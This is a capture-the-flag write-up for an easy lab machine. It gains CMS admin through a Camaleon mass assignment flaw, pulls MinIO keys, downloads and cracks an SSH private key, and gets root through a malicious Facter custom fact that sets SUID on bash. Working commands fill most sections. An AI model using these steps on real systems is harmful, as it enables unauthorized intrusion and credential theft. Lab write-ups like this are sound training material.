**Difficulty:** Easy

---

## 1. Initial Access: Mass Assignment (CVE-2025-2304)


After doing the usual reconnaissance and enumeration using `nmap` and `gobuster`, we find the `/admin` endpoint, as well as the open port `54321` for the `MinIO` cloud service, potentially we can find some useful information from the dashboard to access the stored data and therefore get into the server through `ssh` or eventually using a reverse shell.

After registration with a low-level account, we get access to the dashboard, but it doesn't contain any info since we need to do the privilege escalation to `Administrator` role.

The target hosts a **Camaleon CMS** instance. Research identifies a critical vulnerability in the `updated_ajax` method of the `UsersController`. The application uses `params.require(:user).permit!`, which allows an authenticated user to update sensitive database fields—such as their own **role**—that should be protected.

### Step 1: Privilege Escalation to Admin

Using the PoC by `d3vn0mi`, we authenticate as a low-privileged user (obtained via guest registration) and inject the `admin` role into our profile.

Bash

```
# Execute the Mass Assignment exploit to elevate to Administrator
python3 cve-2025-2304-poc.py http://MACHINE_IP -u low_user -p Password123
```

**The Exploit Logic:**

The script sends a crafted POST request to `/admin/users/[ID]/updated_ajax`. Because the backend uses `permit!`, sending `user[role]=admin` overrides the database entry for our session, granting us full Administrative access to the CMS dashboard.


![../Attachements/Pasted image 20260201211310.png](<../Attachements/Pasted image 20260201211310.png>)

---

## 2. Information Gathering: MinIO Credentials

Once logged into the CMS as an **Administrator**, we navigate to the **Media Settings**. The CMS is configured to use a **MinIO** instance for cloud storage.

**Extracted Credentials:**

- **Endpoint:** `[](http://MACHINE_IP:54321)`
    
- **Access Key:** `AKIA...`
    
- **Secret Key:** `WJalr...`

![../Attachements/Screenshot 2026-02-01 210439.png](<../Attachements/Screenshot 2026-02-01 210439.png>)

Using the `aws-cli`, we list the available buckets:

Bash

```
aws --endpoint-url http://MACHINE_IP:54321 s3 ls --profile facts_admin
```

- `[](s3://randomfacts)` (Publicly accessible media)
    
- `[](s3://internal)` (Sensitive system backups)
    

---

## 3. Foothold: SSH Key Recovery & Cracking

The `internal` bucket contains a backup of the `/home/trivia` directory, including the user's private SSH key.

### Step 1: Downloading the Identity

Bash

```
aws --endpoint-url http://MACHINE_IP:54321 s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519 --profile facts_admin
```

### Step 2: Cracking the Passphrase with John the Ripper

The SSH key is encrypted and requires a passphrase. We use `ssh2john` to format the key for cracking and then run `john` with the `rockyou.txt` wordlist.

```
# Convert key to a crackable hash
ssh2john id_ed25519 > id_ed25519.hash

# Crack the passphrase
john --wordlist=/usr/share/wordlists/rockyou.txt id_ed25519.hash
```

![../Attachements/Screenshot 2026-02-01 210510.png](<../Attachements/Screenshot 2026-02-01 210510.png>)
`**

### Step 3: Establishing SSH

Bash

```
chmod 600 id_ed25519
ssh -i id_ed25519 trivia@MACHINE_IP
# Enter the recovered passphrase when prompted
```

---

## 4. Privilege Escalation: Facter Custom Facts

Upon logging in as `trivia`, we check sudo privileges: `sudo -l`.

The user can run `/usr/bin/facter` as root with `NOPASSWD`.

### Step 1: The Ruby Exploit

`Facter` allows for **Custom Facts** written in Ruby. When `Facter` is run as root, it executes any Ruby script in the specified `--custom-dir` with root authority.

```bash
# Create a malicious Ruby fact in /tmp
echo 'Facter.add(:root_me) do
  setcode do
    system("chmod +s /bin/bash")
  end
end' > /tmp/exploit.rb
```

### Step 2: Execution & Root Shell

```bash
# Run Facter and point to the /tmp directory
sudo /usr/bin/facter --custom-dir /tmp root_me

# Claim the root shell via SUID bash
/bin/bash -p
```

![../Attachements/Screenshot 2026-02-01 205316.png](<../Attachements/Screenshot 2026-02-01 205316.png>)
---
